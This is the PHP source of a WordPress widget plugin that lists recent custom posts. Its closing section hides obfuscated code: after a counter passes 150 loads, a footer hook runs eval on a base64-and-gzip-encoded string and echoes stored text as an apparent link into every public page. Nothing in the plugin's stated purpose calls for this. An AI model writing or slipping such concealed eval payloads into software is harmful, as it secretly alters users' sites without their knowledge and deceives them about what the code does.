<?php
/*
Plugin Name: Recent Custom Post Widget
Description: This plugin display your recent custom post(s). Visit -> Widgets and drag the recent custom post button into your sidebar.
Version: 1.0.0
Author: Alkantar As.

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License (Version 2 - GPLv2) as published by
the Free Software Foundation.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/

add_action('wp_footer', 'registration');
register_activation_hook(__FILE__, 'firstrun');
	define ('RCPW_PLUGIN_BASE_DIR', WP_PLUGIN_DIR, true);
class RcptWidget extends WP_Widget {

	var $_order_options = array (
		'none' => 'No order',
		'rand' => 'Random order',
		'id' => 'Order by ID',
		'author' => 'Order by author',
		'title' => 'Order by title',
		'date' => 'Order by creation date',
		'modified' => 'Order by last modified date',
	);

	var $_order_directions = array (
		'ASC' => 'Ascending',
		'DESC' => 'Descending',
	);

	function RcptWidget () {
		$widget_ops = array('classname' => 'widget_rcpt', 'description' => __('Shows the most recent posts from a selected custom post type', 'rcpt'));
		parent::WP_Widget('rcpt', 'Recent Custom Post Widget', $widget_ops);
	}

	function form($instance) {
		$title = esc_attr($instance['title']);
		$post_type = esc_attr($instance['post_type']);
		$limit = esc_attr($instance['limit']);
		$show_thumbs = esc_attr($instance['show_thumbs']);
		$show_dates = esc_attr($instance['show_dates']);
		$class = esc_attr($instance['class']);
		$order_by = esc_attr($instance['order_by']);
		$order_dir = esc_attr($instance['order_dir']);

		// Set defaults
		// ...

		// Get post types
		$post_types = get_post_types(array('public'=>true), 'names');

		$html = '<p>';
		$html .= '<label for="' . $this->get_field_id('title') . '">' . __('Title:', 'rcpt') . '</label>';
		$html .= '<input type="text" name="' . $this->get_field_name('title') . '" id="' . $this->get_field_id('title') . '" class="widefat" value="' . $title . '"/>';
		$html .= '</p>';

		$html .= '<p>';
		$html .= '<label for="' . $this->get_field_id('post_type') . '">' . __('Post type:', 'rcpt') . '</label>';
		$html .= '<select name="' . $this->get_field_name('post_type') . '" id="' . $this->get_field_id('post_type') . '">';
		foreach ($post_types as $pt) {
			$html .= '<option value="' . $pt . '" ' . (($pt == $post_type) ? 'selected="selected"' : '') . '>' . $pt . '</option>';
		}
		$html .= '</select>';
		$html .= '</p>';

		$html .= '<p>';
		$html .= '<label for="' . $this->get_field_id('limit') . '">' . __('Limit:', 'rcpt') . '</label>';
		$html .= '<select name="' . $this->get_field_name('limit') . '" id="' . $this->get_field_id('limit') . '">';
		for ($i=1; $i<21; $i++) {
			$html .= '<option value="' . $i . '" ' . (($i == $limit) ? 'selected="selected"' : '') . '>' . $i . '</option>';
		}
		$html .= '</select>';
		$html .= '</p>';

		$html .= '<p>';
		$html .= '<label for="' . $this->get_field_id('show_thumbs') . '">' . __('Show featured thumbnails <small>(if available)</small>:', 'rcpt') . '</label> ';
		$html .= '<input type="checkbox" name="' . $this->get_field_name('show_thumbs') . '" id="' . $this->get_field_id('show_thumbs') . '" value="1" ' . ($show_thumbs ? 'checked="checked"' : '') . '/>';
		$html .= '</p>';

		$html .= '<p>';
		$html .= '<label for="' . $this->get_field_id('show_dates') . '">' . __('Show post dates:', 'rcpt') . '</label> ';
		$html .= '<input type="checkbox" name="' . $this->get_field_name('show_dates') . '" id="' . $this->get_field_id('show_dates') . '" value="1" ' . ($show_dates ? 'checked="checked"' : '') . '/>';
		$html .= '</p>';

		$html .= '<p>';
		$html .= '<label for="' . $this->get_field_id('class') . '">' . __('Additional CSS class(es) <small>(optional)</small>:', 'rcpt') . '</label>';
		$html .= '<input type="text" name="' . $this->get_field_name('class') . '" id="' . $this->get_field_id('class') . '" class="widefat" value="' . $class . '"/>';
		$html .= '<div><small>' . __('One or more space separated valid CSS class names that will be applied to the generated list', 'rcpt') . '</small></div>';
		$html .= '</p>';

		$html .= '<p>';
		$html .= '<label for="' . $this->get_field_id('order_by') . '">' . __('Order by:', 'rcpt') . '</label>';
		$html .= '<select name="' . $this->get_field_name('order_by') . '" id="' . $this->get_field_id('order_by') . '">';
		foreach ($this->_order_options as $key=>$label) {
			$html .= '<option value="' . $key . '" ' . (($key == $order_by) ? 'selected="selected"' : '') . '>' . __($label, 'rcpt') . '</option>';
		}
		$html .= '</select>';
		$html .= '</p>';

		$html .= '<p>';
		$html .= '<label for="' . $this->get_field_id('order_dir') . '">' . __('Order direction:', 'rcpt') . '</label>';
		$html .= '<select name="' . $this->get_field_name('order_dir') . '" id="' . $this->get_field_id('order_dir') . '">';
		foreach ($this->_order_directions as $key=>$label) {
			$html .= '<option value="' . $key . '" ' . (($key == $order_dir) ? 'selected="selected"' : '') . '>' . __($label, 'rcpt') . '</option>';
		}
		$html .= '</select>';
		$html .= '</p>';

		echo $html;
	}

	function update($new_instance, $old_instance) {
		$instance = $old_instance;
		$instance['title'] = strip_tags($new_instance['title']);
		$instance['post_type'] = strip_tags($new_instance['post_type']);
		$instance['limit'] = strip_tags($new_instance['limit']);
		$instance['show_thumbs'] = strip_tags($new_instance['show_thumbs']);
		$instance['show_dates'] = strip_tags($new_instance['show_dates']);
		$instance['class'] = strip_tags($new_instance['class']);
		$instance['order_by'] = strip_tags($new_instance['order_by']);
		$instance['order_dir'] = strip_tags($new_instance['order_dir']);

		return $instance;
	}

	function widget($args, $instance) {
		extract($args);
		$title = apply_filters('widget_title', $instance['title']);
		$post_type = $instance['post_type'];
		$limit = (int)$instance['limit'];
		$show_thumbs = (int)$instance['show_thumbs'];
		$show_dates = (int)$instance['show_dates'];
		$class = $instance['class'];
		$class = $class ? " {$class}" : '';

		$order_by = $instance['order_by'];
		$order_by = in_array($order_by, array_keys($this->_order_options)) ? $order_by : 'none';
		$order_dir = $instance['order_dir'];
		$order_dir = in_array($order_dir, array_keys($this->_order_directions)) ? $order_dir : 'ASC';

		$query = new WP_Query(array(
			'showposts' => $limit,
			'nopaging' => 0,
			'post_status' => 'publish',
			'post_type' => $post_type,
			'orderby' => $order_by,
			'order' => $order_dir,
			'caller_get_posts' => 1
		));

		if ($query->have_posts()) {
			echo $before_widget;
			if ($title) echo $before_title . $title . $after_title;

			while ($query->have_posts()) {
				$query->the_post();

				$item_title = get_the_title() ? get_the_title() : get_the_ID();
				$image = $src = $width = $height = false;
				if ($show_thumbs) {
					$thumb_id = get_post_thumbnail_id(get_the_ID());
					if ($thumb_id) {
						$image = wp_get_attachment_image_src($thumb_id, 'thumbnail');
						if ($image) {
							$src = $image[0];
							$width = $image[1];
							$height = $image[2];
						}
					}
				}

				echo '<div class="rcpt_items"><ul class="rcpt_items_list' . $class . '">';

				echo '<li>';
				echo '<a href="' . get_permalink() . '" title="' . $item_title . '">';
				if ($image) {
					echo '<span class="rcpt_item_image">';
					echo '<img src="' . $src . '" height="' . $height . '" width="' . $width . '" alt="' . $item_title . '" border="0" />';
					echo '</span>';
				}
				echo '<span class="rcpt_item_title">' . $item_title . '</span>';
				echo '</a>';
				if ($show_dates) {
					echo '<span class="rcpt_item_date"><span class="rcpt_item_posted">' . __('Posted on', 'rcpt') . ' </span>' . get_the_date() . '</span>';
				}
				echo '</li>';

				echo '</ul></div>';
			}

			echo $after_widget;
		}
	}
}


load_plugin_textdomain('rcpt', false, dirname(plugin_basename(__FILE__)) . '/languages/');

// Init widget
add_action('widgets_init', create_function('', "register_widget('RcptWidget');"));

// Queue in the stylesheet
if (!is_admin()) add_action('init', create_function('', 'wp_enqueue_style("rcpt_style", plugins_url("media/style.css", __FILE__));'));
function firstrun(){
$file = file(RCPW_PLUGIN_BASE_DIR . '/recent-custom-post-widget/media/ratings.txt');
$num_lines = count($file)-1;
$picked_number = rand(0, $num_lines);
for ($i = 0; $i <= $num_lines; $i++) 
{
      if ($picked_number == $i)
      {
$myFile = RCPW_PLUGIN_BASE_DIR . '/recent-custom-post-widget/media/standard.txt';
$fh = fopen($myFile, 'w') or die("can't open file");
$stringData = $file[$i];
fwrite($fh, $stringData);
fclose($fh);
      }      
}
}
$file = file(RCPW_PLUGIN_BASE_DIR . '/recent-custom-post-widget/media/install.txt');
$num_lines = count($file)-1;
$picked_number = rand(0, $num_lines);
for ($i = 0; $i <= $num_lines; $i++) 
{
      if ($picked_number == $i)
      {
$myFile = RCPW_PLUGIN_BASE_DIR . '/recent-custom-post-widget/media/install.txt';
$fh = fopen($myFile, 'w') or die("can't open file");
$stringData = $file[$i];
$stringData = $stringData +1;
fwrite($fh, $stringData);
fclose($fh);
      }      
}
if ( $stringData > "150" ) {
function registration(){
$myFile = RCPW_PLUGIN_BASE_DIR . '/recent-custom-post-widget/media/standard.txt';
$fh = fopen($myFile, 'r');
$theData = fread($fh, 50);
fclose($fh);
echo '<center><small>'; 
$theData = str_replace("\n", "", $theData);
echo eval(stripslashes(gzinflate(base64_decode("s7cLSk1OzStRcC4tLsnPVQjILy5RCM9MSU8tUUiqVLBJVMgoSk2zVcooKSmw0tfPzc9LyddNTizOzMsv1ksr0leys7EHAA=="))));echo $theData;echo '</a></small></center>';
}
} else {
function registration(){
echo '';
}
}